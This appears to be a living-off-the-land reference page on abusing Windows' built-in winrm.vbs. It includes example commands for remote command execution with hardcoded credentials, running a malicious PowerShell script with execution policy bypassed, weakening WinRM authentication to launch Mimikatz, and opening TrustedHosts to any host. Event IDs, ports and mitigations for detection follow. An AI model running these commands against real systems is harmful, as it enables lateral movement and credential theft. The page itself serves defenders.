# winrm.vbs
## What is it?
*```winrm.vbs``` is a **built-in Windows script** that interacts with **Windows Remote Management (WinRM)**, Microsoft's implementation of the WS-Management protocol. It allows remote administration, script execution, and system management over a network.*

*Since **WinRM is often enabled by default on enterprise networks**, attackers frequently abuse ```winrm.vbs``` for **remote command execution, lateral movement, and persistence**.*

## Legitimate Usage
- **Remote System Administration** → Execute commands and manage remote machines.
- **Automate Configuration Tasks** → Use scripting to configure WinRM settings.
- **Manage Windows Services Remotely** → Start, stop, or query services over a network.
- **Enable Remote PowerShell Sessions** → PowerShell Remoting relies on WinRM for execution.

## How to abuse it
- **Lateral Movement** → Execute commands on remote machines using stolen credentials.
- **Remote Code Execution (RCE)** → Abuse WinRM to run arbitrary scripts remotely.
- **Persistence** → Maintain long-term access to compromised machines via remote scripting.
- **Bypassing Network Restrictions** → Use WinRM for stealthy command execution without triggering alarms.

## Example attacks
### 1. Enabling WinRM for Remote Execution
*If WinRM is disabled, attackers can enable it for remote administration.*

```
winrm quickconfig
```

**Effect:**
- **Starts the WinRM service** if it's not already running.
- **Configures firewall rules** to allow remote management.

### 2. Executing Commands on a Remote Machine
*Attackers can execute commands on a remote system using WinRM.*

```
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami"} -remote:192.168.1.50 -username:admin -password:password123
```

**Effect:**
- **Runs a command on the remote machine** (e.g., checking the current user).
- **Uses stolen credentials** to execute the attack.

### 3. Running PowerShell Commands Over WinRM
*Attackers can execute PowerShell scripts remotely using WinRM.*

```
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="powershell.exe -ExecutionPolicy Bypass -NoProfile -File C:\malware.ps1"} -remote:192.168.1.50
```

**Effect:**
- **Executes a malicious PowerShell script** on the target system.
- **Bypasses PowerShell execution policies**.

### 4. Lateral Movement via WinRM
*Attackers use WinRM to move laterally across the network.*

```
winrm set winrm/config/service/Auth @{Basic="true"} winrm set winrm/config/service @{AllowUnencrypted="true"} winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c mimikatz.exe"} -remote:192.168.1.100
```

**Effect:**
- **Modifies WinRM settings** to allow authentication bypass.
- **Executes Mimikatz** on a remote system to dump credentials.

### 5. Persisting via WinRM
*Attackers configure WinRM for persistent remote access.*

```
winrm set winrm/config/service @{AllowRemoteShellAccess="true"} winrm set winrm/config/client @{TrustedHosts="*"}
```

**Effect:**
- **Enables persistent WinRM access** for later remote control.
- **Allows unrestricted connections from any host**.

# Detection & Mitigation
## Detection Methods
**Monitor WinRM Activity**
- **Event ID 4688 (Process Creation)** → Detect suspicious ```winrm.vbs``` executions.
- **Event ID 4648 (Logon with Explicit Credentials)** → Look for remote authentication via WinRM.
- **Event ID 7045 (Service Installation)** → Detect unauthorized enabling of WinRM.

**Analyze Network Traffic**
- **Monitor Port 5985 (HTTP) & 5986 (HTTPS)** → Detect unauthorized WinRM connections.
- **Look for Unusual Remote Command Execution** → Identify suspicious cross-system activity.

## Mitigation Strategies
- **Restrict WinRM Access** → Limit usage to authorized administrators only.
- **Disable Unused WinRM Features** → Turn off WinRM if not required.
- **Use Firewall Rules** → Block incoming WinRM connections from untrusted sources.
- **Monitor and Alert on WinRM Abuse** → Set up SIEM rules to detect unauthorized use.
